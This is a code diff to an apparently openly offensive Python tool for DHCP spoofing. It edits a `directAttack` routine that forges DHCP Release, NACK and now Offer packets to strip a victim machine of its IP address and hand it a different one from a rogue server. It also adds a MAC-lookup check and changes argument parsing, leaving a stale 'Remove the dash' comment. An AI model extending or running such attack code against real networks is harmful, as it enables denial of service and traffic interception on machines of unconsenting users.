@@ -11,7 +11,7 @@ MY_MAC = "DC:97:BA:17:82:BA"
 ip_pool = ["192.168.0." + str(i) for i in range(2, 253)]
 gateway_ip = "192.168.1.1"
 dns_server_ip = "192.168.1.1"
-Intface = "Ethernet 2"
+Intface = "eth0"
 
 leases = {}
     
@@ -42,6 +42,7 @@ def directAttack(ip_address):
     print(f"Directly attacking {ip_address}...")
     forge_false_release(ip_address, 1)  # Send DHCP Release
     forge_false_NACK(ip_address, 1)  # Send DHCP NACK to invalidate IP address
+    forge_false_offer(ip_address, 5)  # Send DHCP Offer with a different IP address
     '''now with the rogue DHCP server, Send a DHCP offer to the victim device with a different IP address.'''
 
 
@@ -201,6 +202,9 @@ def forge_false_NACK(ip_address, number_of_times=1):
     """
     print("starting DHCP NACK")
     mac_address = get_mac_from_ip(ip_address, dhcp_bindings) 
+    if not mac_address:
+        print(f"[!] No MAC mapping found for {ip_address}")
+        return
     print("MAC ADDRESS", mac_address)
     
     mac_bytes = bytes.fromhex(mac_address.replace(":", "")) + b'\x00' * 10
@@ -345,7 +349,7 @@ def main():
         elif choice.startswith("A "):
             parts = choice.split()
             if len(parts) >= 2:
-                ip = parts[1][1:]  # Remove the dash
+                ip = parts[1][:]  # Remove the dash
                 directAttack(ip)
         elif choice == "T":
             print("Sending testing NACK to my own address")
